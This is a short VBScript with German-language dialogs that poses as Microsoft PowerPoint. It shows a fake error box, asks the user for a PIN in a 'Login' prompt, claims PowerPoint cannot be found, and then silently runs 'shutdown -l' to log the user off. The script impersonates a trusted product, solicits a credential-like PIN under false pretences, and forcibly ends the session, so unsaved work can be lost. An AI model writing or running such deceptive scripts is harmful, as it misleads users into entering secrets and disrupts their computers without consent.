X=MsgBox("Fehler beim starten des Programms!",0+16,"Microsoft PowerPoint")
InputBox "Gebe deine PIN ein um Microsoft PowerPoint zu starten.", "Login": MsgBox "Microsoft PowerPoint konnte nicht gefunden werden."

Set shell = CreateObject("WScript.Shell")
shell.Run "shutdown -l", 0, False